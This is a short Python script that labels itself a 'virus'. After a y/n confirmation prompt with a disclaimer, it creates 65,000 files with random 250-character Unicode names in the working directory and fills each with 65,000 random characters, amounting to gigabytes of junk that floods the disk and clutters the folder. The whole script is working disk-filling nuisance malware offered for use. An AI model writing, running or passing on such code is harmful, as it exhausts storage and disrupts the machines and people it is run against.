import os, time, random


while True:
    os.system("color 7 & cls")
    confirm = input("Are you sure you want to execute the virus? I am not responsible for any consequences (y/n)\n> ")
    if confirm.lower() == "y":
        break;
    elif confirm.lower() == "n":
        exit()
    else:
        print(f"'{confirm}' is not a valid option. Type 'y' to execute or 'n' to exit")
        time.sleep(3)
def get_random_unicode(length):
    get_char = chr
    # Update this to include code point ranges to be sampled
    include_ranges = [
        ( 0x0021, 0x0021 ),
        ( 0x0023, 0x0026 ),
        ( 0x0028, 0x007E ),
        ( 0x00A1, 0x00AC ),
        ( 0x00AE, 0x00FF ),
        ( 0x0100, 0x017F ),
        ( 0x0180, 0x024F ),
        ( 0x2C60, 0x2C7F ),
        ( 0x16A0, 0x16F0 ),
        ( 0x0370, 0x0377 ),
        ( 0x037A, 0x037E ),
        ( 0x0384, 0x038A ),
        ( 0x038C, 0x038C ),
    ]
    alphabet = [
        get_char(code_point) for current_range in include_ranges
            for code_point in range(current_range[0], current_range[1])
    ]
    return ''.join(random.choice(alphabet) for i in range(length))
for i in range(65000):
    open(f"{get_random_unicode(250)}", "x", encoding="utf-8").write(str(get_random_unicode(65000)))